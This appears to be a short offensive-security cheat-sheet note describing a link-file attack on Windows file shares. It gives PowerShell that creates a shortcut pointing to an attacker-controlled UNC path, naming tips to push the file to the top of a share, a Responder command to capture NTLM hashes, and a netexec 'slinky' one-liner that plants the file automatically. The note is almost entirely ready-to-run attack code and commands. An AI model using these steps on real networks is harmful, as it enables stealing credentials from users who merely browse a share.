-- -
Link File Attacks, basically a waterhole attack. You link a file on the share to a shell and placing it in a share at the top so that if any user gets on the share, it will execute and you will get a hash on [[Responder]] if it's up and listening. 
#### Manual
On an elevated shell i.e. run as administrator powershell:
```powershell
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk") # location can be anywhere
$lnk.TargetPath = "\\<attack ip>\@test.png" 
$lnk.WindowStyle = 1 # default value
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" # default value
$lnk.Description = "test" # default value
$lnk.HotKey = "Ctrl+Alt+T" # default value
$lnk.Save()
```
Rename the file so that it starts with an `@` or `~` symbol, which will ensure it is the top (or nearly the top) of the share file listing. 

Now run responder:
```bash
sudo responder -i eth0 -dPv
```
Then, put the created file into a file share.
After it's on the share, if a user visits that share, responder should pick up  their hash the same as in [[LLMNR Poisoning]].

#### Automated
If there is an exposed share (writable share), then this will do the above process for you, all you need to do is run responder as above. 
```bash
netexec smb <victim ip> -d <domain> -u <user> -p <password> -M slinky -M slinky -o NAME=<filename> SERVER=<attack ip> 
```